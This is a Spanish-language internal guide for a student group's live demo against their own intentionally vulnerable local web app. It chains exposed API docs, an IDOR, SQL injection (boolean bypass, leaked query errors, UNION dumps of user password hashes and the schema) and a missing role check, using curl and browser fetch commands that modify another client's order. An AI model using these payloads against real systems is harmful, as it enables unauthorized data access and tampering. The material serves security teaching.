# Walkthrough de la demo (guía interna del Grupo 3)

Guion paso a paso para explotar la cadena **en vivo**. No se muestra en la app:
es material de preparación para la presentación y el informe.

- **App:** http://127.0.0.1:5000
- **Atacante:** `cliente1` / `cliente123` (cliente *Distribuidora Andina*, `client_id = 2`)
- **Objetivo:** leer y luego **modificar el pedido #3**, que pertenece a `cliente2`.

> Los comandos usan `curl.exe` (en PowerShell escribí `curl.exe`, no `curl`, para
> evitar el alias de Windows). También se indica la alternativa por navegador.

---

## Paso 0 — Autenticarse como usuario básico

**Navegador:** entrá a http://127.0.0.1:5000, login `cliente1` / `cliente123`.
Vas a ver solo *tus* pedidos (#1, #2, #7).

**curl (guarda la cookie de sesión):**
```powershell
curl.exe -c cookies.txt -X POST http://127.0.0.1:5000/api/auth/login `
  -H "Content-Type: application/json" `
  -d "{\"username\":\"cliente1\",\"password\":\"cliente123\"}"
```

---

## Paso 1 — A02: Security Misconfiguration (docs de API expuestas)

La documentación interactiva de la API está publicada **sin autenticación**.

**Navegador:** abrí http://127.0.0.1:5000/api/docs
(probalo incluso en una ventana de incógnito **sin loguearte**: igual carga).

**Qué observar / contar:**
- Aparece **todo** el mapa de endpoints, incluidos los de `Administración`.
- Se ve `POST /api/admin/orders/{id}` con sus parámetros (`status`, `notes`, `total`).
- Se ve `GET /api/orders/{id}` y `GET /api/products/search?q=`.

**Resultado:** el atacante ya conoce la superficie de la API y sus parámetros.

---

## Paso 2 — A01: Broken Access Control / IDOR

El endpoint de detalle de pedido exige sesión pero **no valida la propiedad**.
Como `cliente1`, pedimos un pedido que **no es nuestro** (el #3, de `cliente2`).

**Navegador:** andá directo a http://127.0.0.1:5000/orders/3
(o a la API cruda http://127.0.0.1:5000/api/orders/3). Cargan datos ajenos.

**curl:**
```powershell
curl.exe -b cookies.txt http://127.0.0.1:5000/api/orders/3
```

**Qué observar:** devuelve el pedido con `"client_id": 3` (otro cliente), sus
renglones, envío y factura. Probá también #4, #5, #8 cambiando el número.

**Resultado:** acceso a información e identificadores de otros clientes.

---

## Paso 3 — A05 (Injection) + A10 (Mishandling of Exceptional Conditions)

La búsqueda de productos arma el SQL **concatenando** el parámetro `q`, y además
**filtra el error** cuando la consulta falla.

**3a. Confirmar la inyección (bypass booleano).** En /productos escribí en el
buscador (o por curl):
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/products/search?q=' OR '1'='1"
```
Devuelve **todos** los productos (la condición siempre es verdadera).

**3b. Fuga de estructura interna (A10).** Forzá un error con un `UNION` de más/menos
columnas:
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/products/search?q=' UNION SELECT 1 -- "
```
La respuesta tiene **status 500** e incluye el **mensaje de error SQL** y la
**query completa**:
```json
{
  "error": "SELECTs to the left and right of UNION do not have the same number of result columns",
  "query": "SELECT id, name, sku, price, stock FROM products WHERE name LIKE '%...' OR sku LIKE '%...'"
}
```
El error revela que la tabla `products` tiene **5 columnas** (dato que usamos en
3c) y la `query` filtrada expone nombres de tablas y columnas. Otra variante que
también rompe la consulta: `?q=' OR 1=`.

**3c. Volcar datos con UNION.** Pegá este payload en el buscador de /productos
(el front lo codifica solo) o usá curl:
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/products/search?q=zz%' UNION SELECT id, username, password_hash, role, client_id FROM users -- "
```
Devuelve la tabla **`users`** (usuarios, hashes, y la columna **`role`** con el
valor `admin`). También se puede mapear el esquema:
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/products/search?q=zz%' UNION SELECT name, sql, type, 1, 1 FROM sqlite_master -- "
```

**Resultado:** se descubre la estructura interna y la existencia de una
**funcionalidad de administración** (roles, tabla de pedidos) a atacar.

---

## Paso 4 — A01: Broken Function Level Authorization (objetivo final)

El endpoint de administración `POST /api/admin/orders/{id}` **no valida el rol**:
alcanza con estar logueado. Como `cliente1` (rol `user`) modificamos el pedido
#3, que es de `cliente2`.

**curl:**
```powershell
curl.exe -b cookies.txt -X POST http://127.0.0.1:5000/api/admin/orders/3 `
  -H "Content-Type: application/json" `
  -d "{\"status\":\"cancelado\",\"notes\":\"Modificado por atacante\"}"
```

**Alternativa por navegador (consola DevTools, F12):**
```javascript
fetch("/api/admin/orders/3", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ status: "cancelado", notes: "Modificado por atacante" })
}).then(r => r.json()).then(console.log);
```

**Verificar que persistió** (de nuevo por IDOR):
```powershell
curl.exe -b cookies.txt http://127.0.0.1:5000/api/orders/3
```
El `status` y las `notes` del pedido ajeno quedaron cambiados. ✅ **Objetivo cumplido.**

---

## Cierre de la cadena

```
/api/docs (A02)  →  mapa de endpoints
      ↓
/api/orders/{id} (A01 IDOR)  →  datos e IDs de otros clientes
      ↓
/api/products/search (A05/A10)  →  estructura interna + rol admin
      ↓
/api/admin/orders/{id} (A01 BFLA)  →  modificación de pedidos ajenos
```

Para repetir la demo desde cero: `python scripts/reset_db.py`.
